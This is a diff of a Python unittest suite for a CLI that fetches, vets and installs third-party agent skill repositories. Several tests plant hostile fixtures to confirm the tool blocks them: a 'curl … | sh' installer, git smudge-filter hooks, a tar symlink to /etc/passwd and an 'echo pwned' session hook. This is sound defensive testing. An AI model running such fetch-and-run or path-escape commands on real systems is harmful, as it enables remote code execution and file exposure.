@@ -118,8 +118,15 @@ class CatalogCliTests(unittest.TestCase):
 
     def clean_food(self, name="sweet-notes"):
         repo = self.make_repo(name, {f"skills/{name}/SKILL.md": skill_md(name), "LICENSE": MIT, "README.md": b"# Notes\n"})
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         return name
+
+    def pass_ab(self, food, *components):
+        """A consented live behavior A/B with a gain and a parity floor for these parts (D17); no v0 runner writes one."""
+        record = {"schema_version": 1, "evidence_id": f"{food}/T3a/ab", "food": food, "provenance": "runner-live", "mode": "live",
+                  "level": "measured", "bundle_sha256": "1" * 64, "consent_id": "c-test", "result": "gain", "integration": "clear",
+                  "parity": "parity", "components": list(components or [f"skill:{food}"])}
+        catalog.save_evidence(self.project, food, "T3a-ab.json", record)
 
     def project_snapshot(self, exclude_layer=True):
         manifest = json.loads((self.project / ".oaw/install.json").read_text(encoding="utf-8"))
@@ -137,12 +144,13 @@ class CatalogCliTests(unittest.TestCase):
     # ------------------------------------------------------------------ intake
 
     def test_batch_add_merges_the_same_repository(self):
-        result = self.cli("add", "https://github.com/Example/Sweet-Notes", "example/sweet-notes.git", "git@github.com:example/other.git")
+        result = self.cli("add", "https://github.com/Example/Sweet-Notes", "example/sweet-notes.git", "git@github.com:example/other.git",
+                          "--no-taste")
         self.assertEqual(sorted(result["added"]), ["other", "sweet-notes"])
         self.assertEqual(len(result["merges"]), 1)
-        again = self.cli("add", "github.com/EXAMPLE/sweet-notes/")
+        again = self.cli("add", "github.com/EXAMPLE/sweet-notes/", "--no-taste")
         self.assertEqual((again["added"], again["existing"][0]["id"]), ([], "sweet-notes"))
-        self.assertEqual(self.cli("add", "https://gitlab.com/x/y", code=0)["errors"][0]["input"], "https://gitlab.com/x/y")
+        self.assertEqual(self.cli("add", "https://gitlab.com/x/y", "--no-taste", code=0)["errors"][0]["input"], "https://gitlab.com/x/y")
         registry = json.loads((self.project / ".oaw/catalog/registry.json").read_text(encoding="utf-8"))
         self.assertEqual(len(registry["foods"]), 2)
         self.assertIn("!builds.json", (self.project / ".oaw/catalog/.gitignore").read_text(encoding="utf-8"))
@@ -174,7 +182,7 @@ class CatalogCliTests(unittest.TestCase):
         smudge = f"sh -c 'echo ran > {(sentinel / 'smudge').as_posix()}'"
         for key in ("filter.evil.smudge", "filter.evil.clean", "filter.evil.process", "uploadpack.packObjectsHook"):
             subprocess.run([GIT, "-C", str(repo), "config", key, smudge], check=True, capture_output=True)
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         before = self.project_snapshot(exclude_layer=False)
         calls, real_run = [], subprocess.run
 
@@ -234,7 +242,7 @@ class CatalogCliTests(unittest.TestCase):
             link = tarfile.TarInfo("sweet-notes-0123456/escape")
             link.type, link.linkname = tarfile.SYMTYPE, "../../etc/passwd"
             archive.addfile(link)
-        self.cli("add", "https://github.com/example/sweet-notes")
+        self.cli("add", "https://github.com/example/sweet-notes", "--no-taste")
         with patch.object(catalog, "find_git", return_value=None), \
                 patch.object(catalog.urllib.request, "urlopen", return_value=FakeResponse(buffer.getvalue())) as urlopen:
             result = self.cli("taste", "sweet-notes")
@@ -253,7 +261,7 @@ class CatalogCliTests(unittest.TestCase):
 
     def test_failed_taste_is_reported_as_stopped(self):
         missing = (self.sources / "missing").as_uri()
-        self.cli("add", missing)
+        self.cli("add", missing, "--no-taste")
         self.assertIn("git fetch failed", self.cli("taste", "missing", code=2)["error"])
         status = json.loads((self.project / ".oaw/catalog/status.json").read_text(encoding="utf-8"))
         self.assertTrue(status["stop_reason"])
@@ -328,7 +336,7 @@ class CatalogCliTests(unittest.TestCase):
     def test_risky_food_needs_owner_triage_with_a_terminal_code(self):
         repo = self.make_repo("risky", {"skills/risky/SKILL.md": skill_md("risky"), "LICENSE": MIT,
                                         "install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         self.assertEqual(self.cli("taste", "risky")["verdict"], "risky")
         self.assertIn("is hold", self.cli("absorb", "risky", "--components", "skill:risky", code=2)["error"])
         flag = next(f["id"] for f in catalog.latest_static(catalog.load_evidence(self.project, "risky"))["flags"] if f["severity"] == "high")
@@ -338,7 +346,12 @@ class CatalogCliTests(unittest.TestCase):
         self.cli("triage", "risky", flag, "--benign", "--reason", "fixture installer")
         decision = catalog.load_decisions(self.project)[-1]
         self.assertIn("unauthenticated", decision["confirmed_via"])
-        self.assertEqual(self.cli("show", "risky")["card"]["verdict"]["headline"], "untested")
+        card = self.cli("show", "risky")["card"]
+        self.assertEqual(card["verdict"]["headline"], "untested")
+        # Triaged clean, the text is still model-facing: it waits for its A/B (D17), then it can be absorbed.
+        self.assertEqual(next(c for c in card["components"] if c["id"] == "skill:risky")["reason_code"], "x0-text-ab")
+        self.assertIn("is hold", self.cli("absorb", "risky", "--components", "skill:risky", code=2)["error"])
+        self.pass_ab("risky")
         self.assertEqual(self.cli("absorb", "risky", "--components", "skill:risky")["status"], "preview")
 
     # ------------------------------------------------------------------ policy and plans
@@ -360,7 +373,7 @@ class CatalogCliTests(unittest.TestCase):
         self.assertIn("unauthenticated", policy["confirmed_via"])
         self.assertNotIn("confirmed_by", policy)
         plan = self.cli("plan", name)["plan"]
-        self.assertEqual(plan["status"], "within policy - paid runs not enabled in v0")
+        self.assertEqual(plan["status"], "within policy for Stage 0/1 - Stage 2 and a second host ask the owner first; paid runs not enabled in v0")
         self.assertIn("0.6-0.9M", plan["estimate"]["label"])
         self.terminal_ok = False
         self.assertIn("interactive terminal", self.cli("policy", "set", "--per-food-tokens", "1", "--weekly-tokens", "2",
@@ -382,12 +395,16 @@ class CatalogCliTests(unittest.TestCase):
         name = self.clean_food()
         self.cli("taste", name)
         installed = self.project / ".agents/skills/sweet-notes/SKILL.md"
+        self.assertIn("is hold", self.cli("absorb", name, "--components", "skill:sweet-notes", code=2)["error"])  # D17: A/B first
+        self.pass_ab(name)
         self.assertEqual(self.cli("absorb", name, "--components", "skill:sweet-notes")["status"], "preview")
         self.assertFalse(installed.exists())
         result = self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
         self.assertEqual(result["doctor"]["status"], "healthy")
         self.assertEqual(installed.read_bytes(), skill_md("sweet-notes"))
-        self.assertEqual(result["effect"]["quality"], "not measured")
+        self.assertEqual(result["effect"]["quality"], "nutritious")  # the A/B that let it in is measured evidence for this build
+        quality = next(line for line in result["effect"]["lines"] if line["metric"] == "quality")
+        self.assertEqual((quality["level"], quality["note"]), ("measured", "enhanced"))
         self.assertEqual(result["effect"]["skills"]["added"], ["sweet-notes"])
         manifest = json.loads((self.project / ".oaw/install.json").read_text(encoding="utf-8"))
         self.assertIn(".agents/skills/sweet-notes/SKILL.md", manifest["managed_files"])
@@ -395,6 +412,7 @@ class CatalogCliTests(unittest.TestCase):
         first, second = [b["name"] for b in builds["builds"]]
         self.assertEqual(builds["builds"][1]["components"], ["sweet-notes:skill:sweet-notes (installed)"])
         self.assertEqual(builds["builds"][1]["effect"]["skills"]["added"], ["sweet-notes"])
+        self.assertEqual(builds["builds"][0]["effect"]["quality"], "not measured")  # the baseline holds no food
         for build in (first, second):
             self.assertRegex(build, r"^2\.0\.0\+build\.\d+\.[0-9a-f]{7}$")
         self.assertEqual((builds["current"], builds["matches"]), (second, second))
@@ -415,6 +433,7 @@ class CatalogCliTests(unittest.TestCase):
         self.assertEqual(self.cli("builds")["matches"], first)
         # The effect is re-evaluated for the restored layer, so no renderer keeps the replaced skill list.
         self.assertEqual(restored["effect"]["skills"]["added"], [])
+        self.assertEqual(restored["effect"]["quality"], "not measured")  # the food's A/B speaks only for builds that hold it
         effect = json.loads((self.project / ".oaw/catalog/view.json").read_text(encoding="utf-8"))["my_oaw"]["effect"]
         self.assertEqual((effect["skills"]["added"], effect.get("stale")), ([], None))
         self.cli("restore", second, "--apply")
@@ -454,6 +473,7 @@ class CatalogCliTests(unittest.TestCase):
         # A later absorption survives re-adding EGM, which a whole-layer restore would undo.
         name = self.clean_food("tidy-notes")
         self.cli("taste", name)
+        self.pass_ab(name)
         self.cli("absorb", name, "--components", "skill:tidy-notes", "--apply")
         tidy = self.project / ".agents/skills/tidy-notes/SKILL.md"
         preview = self.cli("readd", "egm")
@@ -492,7 +512,7 @@ class CatalogCliTests(unittest.TestCase):
         """Run as an agent would (stdin from nowhere, output captured): no code is issued, so none can be recovered."""
         repo = self.make_repo("risky", {"skills/risky/SKILL.md": skill_md("risky"), "LICENSE": MIT,
                                         "install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         self.cli("taste", "risky")
         flag = next(f["id"] for f in catalog.latest_static(catalog.load_evidence(self.project, "risky"))["flags"] if f["severity"] == "high")
         env = {**os.environ, "OAW_LAB_HOME": str(self.lab), "PYTHONUTF8": "1"}
@@ -516,7 +536,7 @@ class CatalogCliTests(unittest.TestCase):
         hook = json.dumps({"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "echo pwned"}]}]}}).encode()
         manifest["managed_files"][".claude/settings.json"] = sha(hook)
         repo = self.make_repo("food-build", {**layer, ".oaw/install.json": oaw.json_bytes(manifest), ".claude/settings.json": hook})
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         self.cli("taste", "food-build")
         lab_ref = catalog.latest_static(catalog.load_evidence(self.project, "food-build"))["sealed"]["lab_ref"]
         data = (self.lab / lab_ref).read_bytes()
@@ -557,6 +577,7 @@ class CatalogCliTests(unittest.TestCase):
     def test_restore_keeps_project_records_changed_after_the_build(self):
         name = self.clean_food()
         self.cli("taste", name)
+        self.pass_ab(name)
         self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
         first = self.cli("builds")["builds"][0]
         self.assertTrue(first["effect"]["lines"])  # the baseline is evaluated against the default too (D12)
@@ -571,6 +592,7 @@ class CatalogCliTests(unittest.TestCase):
     def test_restore_never_overwrites_a_file_the_install_does_not_manage(self):
         name = self.clean_food("tidy-notes")
         self.cli("taste", name)
+        self.pass_ab(name)
         absorbed = self.cli("absorb", name, "--components", "skill:tidy-notes", "--apply")
         self.cli("remove", "tidy-notes", "--reason", "retry later", "--apply")
         own = self.project / ".agents/skills/tidy-notes/SKILL.md"
@@ -586,6 +608,7 @@ class CatalogCliTests(unittest.TestCase):
     def test_restore_keeps_a_custom_file_and_its_custom_status(self):
         name = self.clean_food()
         self.cli("taste", name)
+        self.pass_ab(name)
         self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
         agents = self.project / "AGENTS.md"
         agents.write_bytes(agents.read_bytes() + b"\nOwner-only custom policy line\n")
@@ -627,15 +650,16 @@ class CatalogCliTests(unittest.TestCase):
 
     def test_remove_names_mean_one_thing(self):
         repo = self.make_repo("egm", {"skills/notes-lite/SKILL.md": skill_md("notes-lite"), "LICENSE": MIT})
-        self.assertEqual(self.cli("add", repo.as_uri())["added"], ["local-egm"])  # never the bundled name
+        self.assertEqual(self.cli("add", repo.as_uri(), "--no-taste")["added"], ["local-egm"])  # never the bundled name
         repo = self.make_repo("multi", {"skills/multi/SKILL.md": skill_md("multi"), "skills/multi-extra/SKILL.md": skill_md("multi-extra"),
                                         "LICENSE": MIT})
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         self.cli("taste", "multi")
+        self.pass_ab("multi", "skill:multi", "skill:multi-extra")
         self.cli("absorb", "multi", "--components", "skill:multi,skill:multi-extra", "--apply")
-        self.assertEqual(self.cli("remove", "multi")["deletes"], [".agents/skills/multi/SKILL.md"])
-        self.assertEqual(self.cli("remove", "multi", "--food")["deletes"],
-                         [".agents/skills/multi-extra/SKILL.md", ".agents/skills/multi/SKILL.md"])
+        folder = lambda name: [f".agents/skills/{name}/{f}" for f in ("LICENSE", "OAW-UPSTREAM.md", "SKILL.md")]  # noqa: E731
+        self.assertEqual(self.cli("remove", "multi")["deletes"], folder("multi"))
+        self.assertEqual(self.cli("remove", "multi", "--food")["deletes"], folder("multi-extra") + folder("multi"))
         self.assertTrue(any(a["action"] == "retire" and "egm-review" in a["path"] for a in self.cli("remove", "egm")["actions"]))
 
     def test_remove_never_adds_skills_to_an_explicit_empty_recipe(self):
@@ -652,8 +676,9 @@ class CatalogCliTests(unittest.TestCase):
         frontmatter = skill_md("note-taker").replace(b"\n---\n\n#", b"\nversion: 1.0.0\n---\n\n#", 1)
         escaping = skill_md("link-notes", "See [the guide](../../outside.md) before writing notes.\n")
         repo = self.make_repo("lint-food", {"skills/note-taker/SKILL.md": frontmatter, "skills/link-notes/SKILL.md": escaping, "LICENSE": MIT})
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         self.cli("taste", "lint-food")
+        self.pass_ab("lint-food", "skill:note-taker", "skill:link-notes")
         parts = {c["id"]: c for c in self.cli("show", "lint-food")["card"]["components"]}
         self.assertEqual((parts["skill:note-taker"]["disposition"], parts["skill:note-taker"]["reason_code"]), ("hold", "skill-portable"))
         self.assertIn("is hold", self.cli("absorb", "lint-food", "--components", "skill:note-taker", "--apply", code=2)["error"])
@@ -669,8 +694,9 @@ class CatalogCliTests(unittest.TestCase):
         sentinel.mkdir()
         payload = f"open({str(sentinel / 'ran')!r}, 'w').write('ran')\n".encode()
         repo = self.make_repo("notes", {"skills/notes/SKILL.md": skill_md("notes"), "LICENSE": MIT, "tools/build_index.py": payload})
-        self.cli("add", repo.as_uri())
+        self.cli("add", repo.as_uri(), "--no-taste")
         self.assertEqual(self.cli("taste", "notes")["verdict"], "untested")
+        self.pass_ab("notes")
         parts = {c["id"]: c for c in self.cli("show", "notes")["card"]["components"]}
         self.assertEqual((parts["skill:notes"]["disposition"], parts["exec:tools"]["disposition"]), ("absorb", "hold"))
         with patch.object(subprocess, "Popen", side_effect=AssertionError("subprocess")), \
@@ -692,7 +718,7 @@ class CatalogCliTests(unittest.TestCase):
             with self.assertRaises(catalog.CatalogError) as caught:
                 catalog.fetch_codeload(core.normalize_source("https://github.com/example/bomb"), None)
         self.assertIn("50 MB", str(caught.exception))
-        self.cli("add", "https://github.com/example/bomb")
+        self.cli("add", "https://github.com/example/bomb", "--no-taste")
         with patch.object(catalog, "find_git", return_value="git"), \
                 patch.object(catalog, "fetch_git", side_effect=catalog.CatalogError("Refused: snapshot exceeds the 50 MB limit.")), \
                 patch.object(catalog, "fetch_codeload") as fallback:
@@ -706,7 +732,7 @@ class CatalogCliTests(unittest.TestCase):
 
     def test_a_failed_taste_keeps_its_reason_and_the_food_can_be_forgotten(self):
         missing = (self.sources / "missing").as_uri()
-        self.cli("add", missing)
+        self.cli("add", missing, "--no-taste")
         self.cli("taste", "missing", code=2)
         view = json.loads((self.project / ".oaw/catalog/view.json").read_text(encoding="utf-8"))
         error = next(f for f in view["foods"] if f["id"] == "missing")["last_error"]
@@ -718,12 +744,14 @@ class CatalogCliTests(unittest.TestCase):
         self.assertEqual(catalog.load_decisions(self.project)[-1]["kind"], "forget")
         name = self.clean_food()
         self.cli("taste", name)
+        self.pass_ab(name)
         self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
         self.assertIn("absorbed parts", self.cli("forget", name, "--apply", code=2)["error"])
 
     def test_a_skill_installed_on_one_of_two_hosts_is_shown_as_such(self):
         name = self.clean_food()
         self.cli("taste", name)
+        self.pass_ab(name)
         self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")  # codex-only install
         oaw.apply_plan(oaw.plan_install(self.project, "minimal", False, migrate=True, hosts=["codex", "claude"]), migrate=True)
         effect = self.cli("effect")["effect"]
@@ -748,6 +776,9 @@ class CatalogCliTests(unittest.TestCase):
             self.cli("scout")
         self.assertEqual(http.call_count, 2 * len(catalog.SCOUT_QUERIES))
         self.assertIn("pushed%3A%3E%3D", http.call_args[0][0])
+        # D4: recency decides what is fetched; stars only order the list afterwards.
+        self.assertIn("sort=updated", http.call_args[0][0])
+        self.assertNotIn("stars", http.call_args[0][0])
         self.assertNotIn("Authorization", http.call_args[0][1])
         self.assertEqual(result["kept"], 2)
         self.assertEqual([c["display"] for c in result["candidates"]], ["c/harness", "a/claude-skills"])
@@ -756,7 +787,7 @@ class CatalogCliTests(unittest.TestCase):
         pool = json.loads((self.project / ".oaw/catalog/scout.json").read_text(encoding="utf-8"))
         self.assertEqual(len(pool["candidates"]), 2)
         self.assertEqual(pool["dropped_total"], 4)
-        picked = self.cli("scout", "pick", "2")
+        picked = self.cli("scout", "pick", "2", "--no-taste")
         self.assertEqual(picked["added"], ["claude-skills"])
         registry = json.loads((self.project / ".oaw/catalog/registry.json").read_text(encoding="utf-8"))
         entry = registry["foods"]["claude-skills"]
@@ -777,16 +808,78 @@ class CatalogCliTests(unittest.TestCase):
         out = io.StringIO()
         with redirect_stdout(out):
             self.assertEqual(oaw_status.main(["--project", str(self.project)]), 0)
-        self.assertIn("正在消化：sweet-notes · 完成 3/3 · 未測", out.getvalue())
+        self.assertIn("最近一次試吃：sweet-notes · 完成 3/3 · 未測", out.getvalue())
         view = self.cli("view")
         self.assertEqual(view["status"], "view")
         model = json.loads((self.project / ".oaw/catalog/view.json").read_text(encoding="utf-8"))
         self.assertEqual(model["schema"], core.VIEW_SCHEMA)
         food = model["foods"][0]
-        self.assertEqual((food["tasted"], food["pipeline"]["stage"], food["pipeline"]["state"]), (True, "approve", "current"))
-        self.assertIn("核准 ◉ 版本 ○  等你核准", "\n".join(oaw_status.pipeline_lines(model)))
+        self.assertEqual((food["tasted"], food["pipeline"]["stage"], food["pipeline"]["state"]), (True, "sort", "current"))
+        self.assertIn("計畫 ◐ 盲審 ┄ 實測 ┄ 分流 ◉ 核准 ○ 版本 ○  暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）",
+                      "\n".join(oaw_status.pipeline_lines(model)))
         self.assertEqual(food["plan"]["status"], "waiting for standing policy")
         self.assertFalse(food["components"][0]["in_current_build"])
+
+    # ------------------------------------------------------------------ review regressions: the official process (D19)
+
+    def test_add_and_scout_pick_taste_at_once_unless_told_not_to(self):
+        """D4 + D11: naming or picking a food is the confirmation; the free taste follows without a second command."""
+        repo = self.make_repo("quick-notes", {"skills/quick-notes/SKILL.md": skill_md("quick-notes"), "LICENSE": MIT})
+        fed = self.cli("add", repo.as_uri())
+        self.assertEqual((fed["status"], [t["food"] for t in fed["tasted"]]), ("fed", ["quick-notes"]))
+        registry = json.loads((self.project / ".oaw/catalog/registry.json").read_text(encoding="utf-8"))
+        self.assertEqual(registry["foods"]["quick-notes"]["lifecycle"], "tasted")
+        self.assertEqual(self.cli("add", repo.as_uri())["already_tasted"], ["quick-notes"])
+        missing = (self.sources / "missing").as_uri()
+        failed = self.cli("add", missing, code=2)  # a failed free taste is not "done"
+        self.assertEqual(failed["failed"][0]["food"], "missing")
+        self.assertEqual(self.cli("add", (self.sources / "other").as_uri(), "--no-taste")["status"], "added")
+
+    def test_absorb_ships_the_food_license_and_an_attribution_note(self):
+        """D14 licence route and D3: the copied text travels with its license and where it came from."""
+        name = self.clean_food()
+        self.cli("taste", name)
+        self.pass_ab(name)
+        preview = self.cli("absorb", name, "--components", "skill:sweet-notes")
+        self.assertEqual(preview["writes"], [".agents/skills/sweet-notes/LICENSE", ".agents/skills/sweet-notes/OAW-UPSTREAM.md",
+                                             ".agents/skills/sweet-notes/SKILL.md"])
+        self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
+        folder = self.project / ".agents/skills/sweet-notes"
+        self.assertEqual((folder / "LICENSE").read_bytes(), MIT)
+        note = (folder / "OAW-UPSTREAM.md").read_text(encoding="utf-8")
+        commit = json.loads((self.project / ".oaw/catalog/registry.json").read_text(encoding="utf-8"))["foods"][name]["source"]["commit"]
+        for text in (commit, "Modifications: none", "copied unchanged", "license files shipped here: LICENSE", "private#"):
+            self.assertIn(text, note)
+        self.assertNotIn(str(self.sources), note)  # a local repository is named by its private reference only
+        self.assertNotIn(self.sources.as_posix(), note)
+        self.assertEqual(oaw.doctor(self.project)["status"], "healthy")
+
+    def test_a_removed_skill_needs_a_new_taste_before_it_is_absorbed_again(self):
+        """D6: re-adding needs testing again; the CLI follows the same rule as the page."""
+        ticks = iter(range(86400))
+
+        def clock():
+            n = next(ticks)
+            return f"2026-11-03T{n // 3600:02d}:{n // 60 % 60:02d}:{n % 60:02d}Z"
+        with patch.object(catalog, "now_iso", side_effect=clock):
+            name = self.clean_food()
+            self.cli("taste", name)
+            self.pass_ab(name)
+            self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")
+            self.cli("remove", "sweet-notes", "--reason", "trying without it", "--apply")
+            card = self.cli("show", name)["card"]
+            self.assertEqual((card["pipeline"]["stage"], card["pipeline"]["state"]), ("build", "removed"))
+            self.assertEqual([a["id"] for a in card["pipeline"]["actions"]], ["taste", "forget"])
+            self.assertIn("needs a new taste", self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply", code=2)["error"])
+            self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
+            self.cli("taste", name)
+            self.assertEqual(self.cli("absorb", name, "--components", "skill:sweet-notes", "--apply")["status"], "absorbed")
+        self.assertTrue((self.project / ".agents/skills/sweet-notes/SKILL.md").is_file())
+
+    def test_a_pending_confirmation_exits_3(self):
+        """D14 CLI contract: 3 = a choice is needed (the owner's code), 4 = no match."""
+        with patch.object(catalog, "dispatch", side_effect=catalog.NeedsConfirmation("policy-set: a confirmation code was shown")):
+            self.cli("list", code=3)
 
 
 if __name__ == "__main__":
